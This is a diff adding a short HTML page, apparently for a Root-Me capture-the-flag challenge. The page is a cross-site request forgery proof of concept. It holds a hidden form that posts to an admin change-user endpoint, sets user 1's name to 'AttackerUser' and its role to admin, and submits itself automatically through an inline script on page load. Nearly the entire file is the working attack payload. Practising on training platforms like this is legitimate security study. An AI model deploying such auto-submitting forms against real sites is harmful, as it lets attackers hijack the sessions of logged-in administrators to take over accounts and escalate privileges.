@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Test - Change User</title>
+</head>
+
+<body>
+    <h1>Test CSRF - Change User</h1>
+    <p>Cette page simule une requête malveillante pour modifier un utilisateur.</p>
+    <form action="https://bankroute.challenges.pro.root-me.org/admin/change-user" method="POST">
+        <input type="hidden" name="user_id" value="1"> <!-- ID de l'utilisateur ciblé -->
+        <input type="hidden" name="username" value="AttackerUser"> <!-- Nouveau nom d'utilisateur -->
+        <input type="hidden" name="role" value="admin"> <!-- Nouveau rôle -->
+        <button type="submit">Simuler la modification</button>
+    </form>
+
+    <!-- Script pour soumettre automatiquement le formulaire -->
+    <script>
+        document.forms[0].submit();
+    </script>
+</body>
+
+</html>
